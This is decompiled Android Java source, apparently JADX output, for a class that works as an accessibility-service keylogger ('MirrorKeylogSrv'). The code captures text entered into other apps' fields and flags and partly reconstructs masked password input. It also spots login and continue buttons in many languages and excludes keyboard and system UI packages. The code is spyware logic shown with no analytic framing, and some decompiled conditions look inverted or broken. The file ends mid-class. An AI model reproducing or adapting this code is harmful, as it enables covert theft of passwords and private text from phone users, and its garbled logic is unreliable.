// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Locale;
import java.util.TimeZone;
import java.util.UUID;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.Supplier;
import java.util.regex.Pattern;
import lyr.stable.runtime.ScreenMirrorService;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class j5 {
    public static final Pattern H = Pattern.compile("^[A-Za-z_$][A-Za-z0-9_$]*(?:[.$][A-Za-z_$][A-Za-z0-9_$]*)+@[0-9A-Fa-f]+$");
    public static final Pattern I = Pattern.compile(".*(?i)(\\blog\\s*in\\b|\\bsign\\s*in\\b|\\bcontinue\\b|\\bcontinuar\\b|\\bcontinuer\\b|\\bweiter\\b|\\bcontinua\\b|\\bnext\\b|\\bdone\\b|\\bgo\\b|\\biniciar\\b|\\bconnexion\\b|\\banmelden\\b|\\baccedi\\b|\\bacceder\\b|\\bentrar\\b|\\bingresar\\b).*|.*(登录|登入|登陆|войти|ログイン|로그인|продолжить|继续|下一步|完成|确定).*");
    public static final Pattern J = Pattern.compile(".*(backspace|delete|borrar|退格|删除).*", 2);
    public static final Pattern K = Pattern.compile("^(space|spacebar|空格|espacio|espace|leerzeichen|пробел)$", 2);
    public String A;
    public String B;
    public int C;
    public boolean D;
    public long E;
    public String F;
    public final HashSet G;

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public final HashMap f4307a;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public final HashMap f4308b;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final d2.y f4309c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final AtomicBoolean f4310d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public boolean f4311e;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public boolean f4312f;

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public final Object f4313g;

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public boolean f4314h;

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public final y.e f4315i;

    /* JADX INFO: renamed from: j, reason: collision with root package name */
    public final d2.g f4316j;

    /* JADX INFO: renamed from: k, reason: collision with root package name */
    public final d2.v f4317k;

    /* JADX INFO: renamed from: l, reason: collision with root package name */
    public final e5 f4318l;

    /* JADX INFO: renamed from: m, reason: collision with root package name */
    public final long f4319m;
    public final d2.r n;

    /* JADX INFO: renamed from: o, reason: collision with root package name */
    public final o2 f4320o;

    /* JADX INFO: renamed from: p, reason: collision with root package name */
    public volatile j3 f4321p;

    /* JADX INFO: renamed from: q, reason: collision with root package name */
    public long f4322q;

    /* JADX INFO: renamed from: r, reason: collision with root package name */
    public boolean f4323r;

    /* JADX INFO: renamed from: s, reason: collision with root package name */
    public long f4324s;

    /* JADX INFO: renamed from: t, reason: collision with root package name */
    public String f4325t;

    /* JADX INFO: renamed from: u, reason: collision with root package name */
    public String f4326u;

    /* JADX INFO: renamed from: v, reason: collision with root package name */
    public String f4327v;

    /* JADX INFO: renamed from: w, reason: collision with root package name */
    public String f4328w;

    /* JADX INFO: renamed from: x, reason: collision with root package name */
    public String f4329x;

    /* JADX INFO: renamed from: y, reason: collision with root package name */
    public String f4330y;

    /* JADX INFO: renamed from: z, reason: collision with root package name */
    public String f4331z;

    public j5(d2.g gVar, d2.v vVar) {
        e5 e5Var = new e5();
        d2.r rVar = new d2.r(7);
        o2 o2Var = new o2(6);
        this.f4307a = new HashMap();
        this.f4308b = new HashMap();
        this.f4309c = new d2.y();
        this.f4310d = new AtomicBoolean(false);
        this.f4313g = new Object();
        this.f4315i = new y.e(11);
        this.f4322q = -1L;
        this.f4327v = "";
        this.f4328w = "";
        this.f4330y = "";
        this.f4331z = "";
        this.A = "";
        this.B = "";
        this.G = new HashSet();
        this.f4316j = gVar;
        this.f4317k = vVar;
        this.f4318l = e5Var;
        this.f4319m = 2000L;
        this.n = rVar;
        this.f4320o = o2Var;
    }

    public static f5 A(i5 i5Var, String str) {
        f5 f5Var = new f5();
        if (str == null) {
            str = "";
        }
        f5Var.f3992a = str;
        if (str.isEmpty()) {
            f5Var.f3992a = UUID.randomUUID().toString();
        }
        f5Var.f3993b = i5Var.f4241a;
        f5Var.f3994c = i5Var.f4242b;
        f5Var.f3995d = i5Var.f4246f;
        f5Var.f3996e = i5Var.f4247g;
        f5Var.f3997f = i5Var.f4253m;
        f5Var.f3998g = "";
        f5Var.f3999h = "";
        f5Var.f4000i = "";
        f5Var.f4001j = "";
        return f5Var;
    }

    public static Throwable D(Throwable th, String str, Throwable th2) {
        Log.e("MirrorKeylogSrv", "Keylog shutdown failed to ".concat(str), th2);
        if (th == null) {
            return th2;
        }
        if (th != th2) {
            th.addSuppressed(th2);
        }
        return th;
    }

    public static boolean F(String str, boolean z2) {
        if (z2) {
            return true;
        }
        String lowerCase = (str == null ? "" : str).toLowerCase(Locale.ROOT);
        return lowerCase.equals("com.android.systemui") || lowerCase.endsWith(".systemui") || s(str);
    }

    public static boolean G(String str) {
        return !str.isEmpty() && f(str);
    }

    public static boolean H(int i3, long j3, long j4) {
        return i3 >= 4 && j3 > 0 && j4 - j3 <= 15000;
    }

    public static String I(AccessibilityNodeInfo accessibilityNodeInfo) {
        Rect rect = new Rect();
        try {
            accessibilityNodeInfo.getBoundsInScreen(rect);
            return rect.left + "," + rect.top + "," + rect.right + "," + rect.bottom;
        } catch (Throwable unused) {
            return "";
        }
    }

    public static String J(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (Build.VERSION.SDK_INT < 33) {
            return "";
        }
        try {
            return M(accessibilityNodeInfo.getUniqueId());
        } catch (Throwable unused) {
            return "";
        }
    }

    public static String M(CharSequence charSequence) {
        return charSequence == null ? "" : charSequence.toString();
    }

    public static boolean a(String str, String str2) {
        return !str.isEmpty() && !str2.isEmpty() && v(str) && v(str2);
    }

    /* JADX WARN: Code duplicated, block: B:12:0x0023  */
    /* JADX WARN: Code duplicated, block: B:9:0x001b A[Catch: all -> 0x0017, TryCatch #2 {all -> 0x0017, blocks: (B:4:0x0010, B:14:0x0026, B:27:0x004d, B:30:0x0061, B:32:0x0065, B:37:0x0070, B:40:0x0078, B:41:0x0080, B:43:0x0086, B:45:0x008c, B:47:0x0092, B:53:0x009e, B:55:0x00a4, B:59:0x00ac, B:75:0x00ea, B:74:0x00e5, B:68:0x00d2, B:65:0x00c6, B:62:0x00ba, B:35:0x006c, B:26:0x0045, B:23:0x0039, B:9:0x001b), top: B:89:0x0010 }] */
    public static h5 b(AccessibilityEvent accessibilityEvent) {
        boolean z2;
        String strN;
        int windowId;
        String strM = M(accessibilityEvent.getPackageName());
        AccessibilityNodeInfo source = accessibilityEvent.getSource();
        boolean z3 = true;
        if (source != null) {
            try {
                if (!t(source)) {
                    if (s(strM)) {
                        z2 = false;
                    }
                }
                z2 = true;
            } finally {
                if (source != null) {
                    try {
                        source.recycle();
                    } catch (Throwable unused) {
                    }
                }
            }
        } else if (s(strM)) {
            z2 = false;
        } else {
            z2 = true;
        }
        if (!z2 && F(strM, false)) {
            return null;
        }
        String strM2 = source == null ? "" : M(source.getText());
        String strM3 = source == null ? "" : M(source.getContentDescription());
        String strM4 = M(accessibilityEvent.getContentDescription());
        String strO = o(accessibilityEvent);
        String[] strArr = {strM2, strM3, strM4, strO};
        int i3 = 0;
        while (true) {
            if (i3 >= 4) {
                strN = "";
                break;
            }
            strN = strArr[i3];
            if (strN != null && !strN.isEmpty()) {
                break;
            }
            i3++;
        }
        if (strN.isEmpty() && source != null) {
            strN = n(source, new int[]{0});
        }
        boolean z4 = e(strM2) || e(strM3) || e(strM4) || e(strO);
        if (source == null || (!source.isEditable() && !source.isPassword())) {
            z3 = false;
        }
        String strM5 = M(accessibilityEvent.getClassName());
        String strM6 = source == null ? "" : M(source.getViewIdResourceName());
        String strM7 = source == null ? "" : M(source.getHintText());
        String strJ = source == null ? "" : J(source);
        try {
            windowId = accessibilityEvent.getWindowId();
        } catch (Throwable unused2) {
            windowId = -1;
        }
        return new h5(strM, strM5, strN, strM6, strM7, strJ, windowId, source != null ? I(source) : "", z3, z2, z4);
    }

    /* JADX WARN: Code duplicated, block: B:105:0x0137 A[Catch: all -> 0x0021, TRY_ENTER, TryCatch #2 {all -> 0x0021, blocks: (B:7:0x0019, B:13:0x0025, B:20:0x0036, B:25:0x0048, B:27:0x004e, B:30:0x0059, B:31:0x0066, B:33:0x006c, B:35:0x0074, B:36:0x0078, B:38:0x007e, B:40:0x0084, B:43:0x008b, B:47:0x0095, B:49:0x009f, B:53:0x00a8, B:55:0x00b2, B:60:0x00bd, B:62:0x00c3, B:76:0x00dc, B:78:0x00e2, B:80:0x00e8, B:82:0x00ee, B:84:0x00f4, B:90:0x0101, B:106:0x013c, B:108:0x0149, B:113:0x0164, B:105:0x0137, B:99:0x0127, B:96:0x011b, B:93:0x010f, B:24:0x0040), top: B:129:0x0019 }] */
    /* JADX WARN: Code duplicated, block: B:112:0x015c  */
    /* JADX WARN: Code duplicated, block: B:127:0x002d A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:12:0x0024  */
    /* JADX WARN: Code duplicated, block: B:133:0x0033 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:135:0x0169 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:15:0x002b A[DONT_INVERT] */
    /* JADX WARN: Code duplicated, block: B:18:0x0031 A[DONT_INVERT] */
    /* JADX WARN: Code duplicated, block: B:23:0x003e  */
    /* JADX WARN: Code duplicated, block: B:24:0x0040 A[Catch: all -> 0x0021, TRY_ENTER, TryCatch #2 {all -> 0x0021, blocks: (B:7:0x0019, B:13:0x0025, B:20:0x0036, B:25:0x0048, B:27:0x004e, B:30:0x0059, B:31:0x0066, B:33:0x006c, B:35:0x0074, B:36:0x0078, B:38:0x007e, B:40:0x0084, B:43:0x008b, B:47:0x0095, B:49:0x009f, B:53:0x00a8, B:55:0x00b2, B:60:0x00bd, B:62:0x00c3, B:76:0x00dc, B:78:0x00e2, B:80:0x00e8, B:82:0x00ee, B:84:0x00f4, B:90:0x0101, B:106:0x013c, B:108:0x0149, B:113:0x0164, B:105:0x0137, B:99:0x0127, B:96:0x011b, B:93:0x010f, B:24:0x0040), top: B:129:0x0019 }] */
    /* JADX WARN: Code duplicated, block: B:37:0x007d  */
    /* JADX WARN: Code duplicated, block: B:45:0x0091  */
    /* JADX WARN: Code duplicated, block: B:46:0x0093  */
    /* JADX WARN: Code duplicated, block: B:52:0x00a7  */
    /* JADX WARN: Code duplicated, block: B:58:0x00ba  */
    /* JADX WARN: Code duplicated, block: B:60:0x00bd A[Catch: all -> 0x0021, TryCatch #2 {all -> 0x0021, blocks: (B:7:0x0019, B:13:0x0025, B:20:0x0036, B:25:0x0048, B:27:0x004e, B:30:0x0059, B:31:0x0066, B:33:0x006c, B:35:0x0074, B:36:0x0078, B:38:0x007e, B:40:0x0084, B:43:0x008b, B:47:0x0095, B:49:0x009f, B:53:0x00a8, B:55:0x00b2, B:60:0x00bd, B:62:0x00c3, B:76:0x00dc, B:78:0x00e2, B:80:0x00e8, B:82:0x00ee, B:84:0x00f4, B:90:0x0101, B:106:0x013c, B:108:0x0149, B:113:0x0164, B:105:0x0137, B:99:0x0127, B:96:0x011b, B:93:0x010f, B:24:0x0040), top: B:129:0x0019 }] */
    /* JADX WARN: Code duplicated, block: B:65:0x00cb  */
    /* JADX WARN: Code duplicated, block: B:67:0x00ce  */
    /* JADX WARN: Code duplicated, block: B:68:0x00cf  */
    /* JADX WARN: Code duplicated, block: B:69:0x00d1  */
    /* JADX WARN: Code duplicated, block: B:75:0x00db  */
    /* JADX WARN: Code duplicated, block: B:92:0x010d  */
    /* JADX WARN: Code duplicated, block: B:93:0x010f A[Catch: all -> 0x0021, TryCatch #2 {all -> 0x0021, blocks: (B:7:0x0019, B:13:0x0025, B:20:0x0036, B:25:0x0048, B:27:0x004e, B:30:0x0059, B:31:0x0066, B:33:0x006c, B:35:0x0074, B:36:0x0078, B:38:0x007e, B:40:0x0084, B:43:0x008b, B:47:0x0095, B:49:0x009f, B:53:0x00a8, B:55:0x00b2, B:60:0x00bd, B:62:0x00c3, B:76:0x00dc, B:78:0x00e2, B:80:0x00e8, B:82:0x00ee, B:84:0x00f4, B:90:0x0101, B:106:0x013c, B:108:0x0149, B:113:0x0164, B:105:0x0137, B:99:0x0127, B:96:0x011b, B:93:0x010f, B:24:0x0040), top: B:129:0x0019 }] */
    /* JADX WARN: Code duplicated, block: B:95:0x0119  */
    /* JADX WARN: Code duplicated, block: B:96:0x011b A[Catch: all -> 0x0021, TryCatch #2 {all -> 0x0021, blocks: (B:7:0x0019, B:13:0x0025, B:20:0x0036, B:25:0x0048, B:27:0x004e, B:30:0x0059, B:31:0x0066, B:33:0x006c, B:35:0x0074, B:36:0x0078, B:38:0x007e, B:40:0x0084, B:43:0x008b, B:47:0x0095, B:49:0x009f, B:53:0x00a8, B:55:0x00b2, B:60:0x00bd, B:62:0x00c3, B:76:0x00dc, B:78:0x00e2, B:80:0x00e8, B:82:0x00ee, B:84:0x00f4, B:90:0x0101, B:106:0x013c, B:108:0x0149, B:113:0x0164, B:105:0x0137, B:99:0x0127, B:96:0x011b, B:93:0x010f, B:24:0x0040), top: B:129:0x0019 }] */
    /* JADX WARN: Code duplicated, block: B:98:0x0125  */
    /* JADX WARN: Code duplicated, block: B:99:0x0127 A[Catch: all -> 0x0021, TRY_LEAVE, TryCatch #2 {all -> 0x0021, blocks: (B:7:0x0019, B:13:0x0025, B:20:0x0036, B:25:0x0048, B:27:0x004e, B:30:0x0059, B:31:0x0066, B:33:0x006c, B:35:0x0074, B:36:0x0078, B:38:0x007e, B:40:0x0084, B:43:0x008b, B:47:0x0095, B:49:0x009f, B:53:0x00a8, B:55:0x00b2, B:60:0x00bd, B:62:0x00c3, B:76:0x00dc, B:78:0x00e2, B:80:0x00e8, B:82:0x00ee, B:84:0x00f4, B:90:0x0101, B:106:0x013c, B:108:0x0149, B:113:0x0164, B:105:0x0137, B:99:0x0127, B:96:0x011b, B:93:0x010f, B:24:0x0040), top: B:129:0x0019 }] */
    public static i5 c(AccessibilityEvent accessibilityEvent) {
        boolean z2;
        String strO;
        String strI;
        String strM;
        String string;
        String strM2;
        boolean z3;
        boolean z4;
        boolean z5;
        boolean z6;
        String strM3;
        String strM4;
        String strJ;
        int windowId;
        String str;
        boolean z7;
        boolean z8;
        String strM5 = M(accessibilityEvent.getPackageName());
        if (!F(strM5, false)) {
            AccessibilityNodeInfo source = accessibilityEvent.getSource();
            if (source != null) {
                try {
                    if (t(source)) {
                        z2 = true;
                    } else {
                        z2 = false;
                    }
                    if (F(strM5, z2)) {
                        if (source != null) {
                            try {
                                source.refresh();
                            } catch (Throwable unused) {
                            }
                        }
                        strO = o(accessibilityEvent);
                        strI = "";
                        if (source == null) {
                            strM = "";
                        } else {
                            strM = M(source.getText());
                        }
                        if (accessibilityEvent.getText() != null || accessibilityEvent.getText().isEmpty()) {
                            string = "";
                        } else {
                            StringBuilder sb = new StringBuilder();
                            for (CharSequence charSequence : accessibilityEvent.getText()) {
                                if (charSequence != null) {
                                    sb.append(charSequence);
                                }
                            }
                            string = sb.toString();
                        }
                        if (strO.isEmpty() && !string.isEmpty()) {
                            strO = string;
                        }
                        if (strM.equals(strO)) {
                            strI = strM;
                        }
                        strM2 = M(accessibilityEvent.getBeforeText());
                        if (source == null && source.isPassword()) {
                            z3 = true;
                        } else {
                            z3 = false;
                        }
                        boolean zIsPassword = accessibilityEvent.isPassword();
                        if (string.isEmpty() && v(string)) {
                            z4 = true;
                        } else {
                            z4 = false;
                        }
                        if (z4) {
                            z5 = true;
                        } else {
                            if (strM.isEmpty() && v(strM)) {
                                z8 = true;
                            } else {
                                z8 = false;
                            }
                            if (z8) {
                                z5 = true;
                            } else {
                                z5 = false;
                            }
                        }
                        if (!z3 || zIsPassword || z5) {
                            z6 = true;
                        } else {
                            z6 = false;
                        }
                        if (strO.isEmpty() || !strM.isEmpty() || !strM2.isEmpty() || accessibilityEvent.getAddedCount() != 0 || accessibilityEvent.getRemovedCount() != 0) {
                            String strM6 = M(accessibilityEvent.getClassName());
                            if (source == null) {
                                strM3 = "";
                            } else {
                                strM3 = M(source.getViewIdResourceName());
                            }
                            if (source == null) {
                                strM4 = strI;
                            } else {
                                strM4 = M(source.getHintText());
                            }
                            if (source == null) {
                                strJ = strI;
                            } else {
                                strJ = J(source);
                            }
                            try {
                                windowId = accessibilityEvent.getWindowId();
                            } catch (Throwable unused2) {
                                windowId = -1;
                            }
                            strI = source != null ? I(source) : "";
                            String str2 = strJ;
                            int addedCount = accessibilityEvent.getAddedCount();
                            accessibilityEvent.getRemovedCount();
                            int fromIndex = accessibilityEvent.getFromIndex();
                            if (z6 || !a(strO, strM)) {
                                str = strM4;
                                z7 = false;
                            } else {
                                str = strM4;
                                z7 = true;
                            }
                            i5 i5Var = new i5(strM5, strM6, strO, strI, strM2, strM3, str, str2, windowId, strI, addedCount, fromIndex, z6, z2, z7);
                            if (source != null) {
                                try {
                                    source.recycle();
                                } catch (Throwable unused3) {
                                }
                            }
                            return i5Var;
                        }
                        if (source != null) {
                            try {
                                source.recycle();
                            } catch (Throwable unused4) {
                            }
                        }
                    } else if (source != null) {
                        try {
                            source.recycle();
                        } catch (Throwable unused5) {
                        }
                        return null;
                    }
                } catch (Throwable th) {
                    if (source != null) {
                        try {
                            source.recycle();
                        } catch (Throwable unused6) {
                        }
                    }
                    throw th;
                }
            } else {
                z2 = false;
                if (F(strM5, z2)) {
                    if (source != null) {
                        source.refresh();
                    }
                    strO = o(accessibilityEvent);
                    strI = "";
                    if (source == null) {
                        strM = "";
                    } else {
                        strM = M(source.getText());
                    }
                    if (accessibilityEvent.getText() != null) {
                        string = "";
                    } else {
                        string = "";
                    }
                    if (strO.isEmpty()) {
                        strO = string;
                    }
                    if (strM.equals(strO)) {
                        strI = strM;
                    }
                    strM2 = M(accessibilityEvent.getBeforeText());
                    if (source == null) {
                        z3 = false;
                    } else {
                        z3 = false;
                    }
                    boolean zIsPassword2 = accessibilityEvent.isPassword();
                    if (string.isEmpty()) {
                        z4 = false;
                    } else {
                        z4 = false;
                    }
                    if (z4) {
                        z5 = true;
                    } else {
                        if (strM.isEmpty()) {
                            z8 = false;
                        } else {
                            z8 = false;
                        }
                        if (z8) {
                            z5 = true;
                        } else {
                            z5 = false;
                        }
                    }
                    if (z3) {
                        z6 = true;
                    } else {
                        z6 = true;
                    }
                    if (strO.isEmpty()) {
                    }
                    String strM7 = M(accessibilityEvent.getClassName());
                    if (source == null) {
                        strM3 = "";
                    } else {
                        strM3 = M(source.getViewIdResourceName());
                    }
                    if (source == null) {
                        strM4 = strI;
                    } else {
                        strM4 = M(source.getHintText());
                    }
                    if (source == null) {
                        strJ = strI;
                    } else {
                        strJ = J(source);
                    }
                    windowId = accessibilityEvent.getWindowId();
                    if (source != null) {
                    }
                    String str3 = strJ;
                    int addedCount2 = accessibilityEvent.getAddedCount();
                    accessibilityEvent.getRemovedCount();
                    int fromIndex2 = accessibilityEvent.getFromIndex();
                    if (z6) {
                        str = strM4;
                        z7 = false;
                    } else {
                        str = strM4;
                        z7 = false;
                    }
                    i5 i5Var2 = new i5(strM5, strM7, strO, strI, strM2, strM3, str, str3, windowId, strI, addedCount2, fromIndex2, z6, z2, z7);
                    if (source != null) {
                        source.recycle();
                    }
                    return i5Var2;
                }
                if (source != null) {
                    source.recycle();
                    return null;
                }
            }
        }
        return null;
    }

    public static i5 d(AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo source;
        int windowId;
        String strM = M(accessibilityEvent.getPackageName());
        boolean z2 = false;
        if (!F(strM, false) && (source = accessibilityEvent.getSource()) != null) {
            try {
                if (!source.isEditable() && !source.isPassword()) {
                    return null;
                }
                boolean zT = t(source);
                if (F(strM, zT)) {
                    return null;
                }
                try {
                    source.refresh();
                } catch (Throwable unused) {
                }
                String strO = o(accessibilityEvent);
                String strM2 = M(source.getText());
                String str = strM2.equals(strO) ? "" : strM2;
                String strM3 = M(source.getViewIdResourceName());
                String strJ = J(source);
                String strM4 = M(source.getHintText());
                String strI = I(source);
                if (!strO.isEmpty() || !strM2.isEmpty() || !strM4.isEmpty() || !strM3.isEmpty() || !strI.isEmpty()) {
                    boolean zIsPassword = source.isPassword();
                    String strM5 = M(accessibilityEvent.getClassName());
                    try {
                        windowId = accessibilityEvent.getWindowId();
                    } catch (Throwable unused2) {
                        windowId = -1;
                    }
                    if (zIsPassword && a(strO, strM2)) {
                        z2 = true;
                    }
                    return new i5(strM, strM5, strO, str, "", strM3, strM4, strJ, windowId, strI, 0, 0, zIsPassword, zT, z2);
                }
            } finally {
                try {
                    source.recycle();
                } catch (Throwable unused3) {
                }
            }
        }
        return null;
    }

    public static boolean e(String str) {
        if (str == null) {
            str = "";
        }
        String lowerCase = str.toLowerCase(Locale.ROOT);
        return lowerCase.contains("复制") || lowerCase.contains("剪切") || lowerCase.contains("copy") || lowerCase.contains("cut");
    }

    public static boolean f(String str) {
        if (str == null) {
            return false;
        }
        for (int i3 = 0; i3 < str.length(); i3++) {
            if (w(str.charAt(i3))) {
                return true;
            }
        }
        return false;
    }

    public static d2.w g(String str, String str2, String str3, String str4, String str5, String str6, int i3, boolean z2) {
        return h(str, str2, str3, str4, str5, str6, i3, z2, "", "", "");
    }

    public static d2.w h(String str, String str2, String str3, String str4, String str5, String str6, int i3, boolean z2, String str7, String str8, String str9) {
        long jCurrentTimeMillis = System.currentTimeMillis();
        return new d2.w(UUID.randomUUID().toString(), jCurrentTimeMillis, TimeZone.getDefault().getOffset(jCurrentTimeMillis) / 60000, str, str2, str3, str4, str5, str6, i3, z2, str7, str8, str9);
    }

    public static String m(String str, int i3, String str2, String str3, String str4, String str5) {
        if (!(str5 == null ? "" : str5).isEmpty()) {
            return "unique|" + str + "|" + i3 + "|" + str5;
        }
        StringBuilder sb = new StringBuilder("node|");
        sb.append(str);
        sb.append("|");
        sb.append(i3);
        sb.append("|");
        if (str2 == null) {
            str2 = "";
        }
        sb.append(str2);
        sb.append("|");
        sb.append(str3);
        sb.append("|");
        if (str4 == null) {
            str4 = "";
        }
        sb.append(str4);
        return sb.toString();
    }

    public static String n(AccessibilityNodeInfo accessibilityNodeInfo, int[] iArr) {
        int i3 = iArr[0];
        if (i3 <= 24) {
            iArr[0] = i3 + 1;
            try {
                int childCount = accessibilityNodeInfo.getChildCount();
                for (int i4 = 0; i4 < childCount && iArr[0] <= 24; i4++) {
                    try {
                        AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i4);
                        if (child == null) {
                            continue;
                        } else {
                            try {
                                CharSequence contentDescription = child.getContentDescription();
                                if (contentDescription != null && contentDescription.length() > 0 && contentDescription.length() <= 40) {
                                    String string = contentDescription.toString();
                                    try {
                                        child.recycle();
                                    } catch (Throwable unused) {
                                    }
                                    return string;
                                }
                                CharSequence text = child.getText();
                                if (text != null && text.length() > 0 && text.length() <= 40) {
                                    String string2 = text.toString();
                                    try {
                                        child.recycle();
                                    } catch (Throwable unused2) {
                                    }
                                    return string2;
                                }
                                String strN = n(child, iArr);
                                if (!strN.isEmpty()) {
                                    try {
                                        child.recycle();
                                    } catch (Throwable unused3) {
                                    }
                                    return strN;
                                }
                                child.recycle();
                            } catch (Throwable th) {
                                try {
                                    child.recycle();
                                } catch (Throwable unused4) {
                                }
                                throw th;
                            }
                        }
                    } catch (Throwable unused5) {
                    }
                }
            } catch (Throwable unused6) {
            }
        }
        return "";
    }

    public static String o(AccessibilityEvent accessibilityEvent) {
        return (accessibilityEvent.getText() == null || accessibilityEvent.getText().isEmpty()) ? "" : M(accessibilityEvent.getText().get(0));
    }

    public static boolean s(String str) {
        if (str == null) {
            str = "";
        }
        String lowerCase = str.toLowerCase(Locale.ROOT);
        return lowerCase.contains(".inputmethod.") || lowerCase.endsWith(".inputmethod") || lowerCase.equals("com.samsung.android.honeyboard") || lowerCase.startsWith("com.touchtype.swiftkey") || lowerCase.equals("com.baidu.input") || lowerCase.startsWith("com.sohu.inputmethod");
    }

    public static boolean t(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityWindowInfo window;
        boolean z2 = false;
        try {
            window = accessibilityNodeInfo.getWindow();
            if (window != null) {
                try {
                    if (window.getType() == 2) {
                        z2 = true;
                    }
                } catch (Throwable unused) {
                    if (window != null) {
                        try {
                            window.recycle();
                        } catch (Throwable unused2) {
                        }
                    }
                    return false;
                }
            }
            if (window != null) {
                try {
                    window.recycle();
                } catch (Throwable unused3) {
                }
            }
            return z2;
        } catch (Throwable unused4) {
            window = null;
        }
    }

    public static boolean u(String str) {
        return !str.isEmpty() && I.matcher(str.trim()).matches();
    }

    public static boolean v(String str) {
        if (str != null && !str.isEmpty()) {
            for (int i3 = 0; i3 < str.length(); i3++) {
                if (!w(str.charAt(i3))) {
                    return false;
                }
            }
        }
        return true;
    }

    public static boolean w(char c3) {
        return c3 == 8226 || c3 == 8226 || c3 == '*' || c3 == 9679 || c3 == 9642;
    }

    public final void B(AccessibilityEvent accessibilityEvent) {
        int eventType = accessibilityEvent.getEventType();
        if (eventType == 1) {
            try {
                h5 h5VarB = b(accessibilityEvent);
                if (h5VarB != null) {
                    boolean z2 = h5VarB.f4198j;
                    if (z2 || !F(h5VarB.f4189a, z2)) {
                        l(new d2.c(this, h5VarB, 5));
                        return;
                    }
                    return;
                }
                return;
            } catch (Throwable th) {
                a0.a.p(th, new StringBuilder("onAccessibilityEvent click: "), "MirrorKeylogSrv");
                return;
            }
        }
        if (eventType == 8) {
            try {
                i5 i5VarD = d(accessibilityEvent);
                if (i5VarD == null || F(i5VarD.f4241a, i5VarD.n)) {
                    return;
                }
                synchronized (this.f4313g) {
                    try {
                        if (this.f4314h) {
                            this.f4318l.a(new a5(this, i5VarD, this.f4315i, 0));
                            return;
                        }
                        return;
                    } catch (Throwable th2) {
                        throw th2;
                    }
                }
            } catch (Throwable th3) {
                a0.a.p(th3, new StringBuilder("onAccessibilityEvent focus: "), "MirrorKeylogSrv");
                return;
            }
        }
        if (eventType != 16) {
            return;
        }
        try {
            i5 i5VarC = c(accessibilityEvent);
            if (i5VarC == null || F(i5VarC.f4241a, i5VarC.n)) {
                return;
            }
            synchronized (this.f4313g) {
                try {
                    if (this.f4314h) {
                        this.f4318l.a(new a5(this, i5VarC, this.f4315i, 1));
                    }
                } catch (Throwable th4) {
                    throw th4;
                }
            }
        } catch (Throwable th5) {
            a0.a.p(th5, new StringBuilder("onAccessibilityEvent capture: "), "MirrorKeylogSrv");
        }
    }

    public final String C(String str, String str2) {
        char[] cArr = (char[]) this.f4308b.get(str);
        if (cArr == null || cArr.length == 0) {
            return str2 != null ? str2 : "";
        }
        for (char c3 : cArr) {
            if (c3 == 0) {
                if (str2 == null) {
                    str2 = "";
                }
                StringBuilder sb = new StringBuilder(cArr.length);
                for (int i3 = 0; i3 < cArr.length; i3++) {
                    char c4 = cArr[i3];
                    if (c4 != 0) {
                        sb.append(c4);
                    } else if (i3 < str2.length()) {
                        sb.append(str2.charAt(i3));
                    } else {
                        sb.append((char) 8226);
                    }
                }
                int i4 = 0;
                for (char c5 : cArr) {
                    if (c5 != 0 && !w(c5)) {
                        i4++;
                    }
                }
                return i4 > 0 ? sb.toString() : str2;
            }
        }
        return new String(cArr);
    }

    public final String E(i5 i5Var) {
        String str = i5Var.f4244d;
        String str2 = i5Var.f4243c;
        if (i5Var.f4254o) {
            try {
                this.f4320o.getClass();
                String strN = o2.n();
                if (strN != null && !strN.isEmpty() && !v(strN)) {
                    str = strN;
                }
            } catch (Throwable th) {
                Log.w("MirrorKeylogSrv", "focused text resolver failed: ".concat(th.getClass().getSimpleName()));
            }
        }
        if (i5Var.f4253m) {
            if (!str.isEmpty() && !v(str)) {
                return str;
            }
            if (!str2.isEmpty()) {
                return str2;
            }
        }
        return str.isEmpty() ? str2 : str;
    }

    public final synchronized void K() {
        if (this.f4310d.get()) {
            return;
        }
        if (this.f4311e || this.f4312f) {
            throw new IllegalStateException("keylog server is stopped");
        }
        d2.g gVar = this.f4316j;
        synchronized (gVar) {
            if (gVar.f581w || gVar.f580v) {
                throw new IllegalStateException("writer is closed");
            }
            gVar.G();
        }
        this.f4318l.b();
        synchronized (this.f4313g) {
            this.f4314h = true;
        }
        this.f4310d.set(true);
    }

    /* JADX WARN: Code duplicated, block: B:43:0x0088 A[Catch: all -> 0x00a5, TryCatch #1 {, blocks: (B:3:0x0001, B:5:0x0005, B:8:0x000b, B:41:0x0082, B:43:0x0088, B:45:0x0093, B:47:0x0097, B:48:0x0099, B:49:0x009a, B:50:0x00a1, B:51:0x00a2, B:52:0x00a4, B:58:0x00aa, B:59:0x00ae, B:13:0x002b, B:40:0x007c, B:36:0x006f, B:30:0x004d, B:16:0x0031), top: B:66:0x0001, inners: #0, #3 }] */
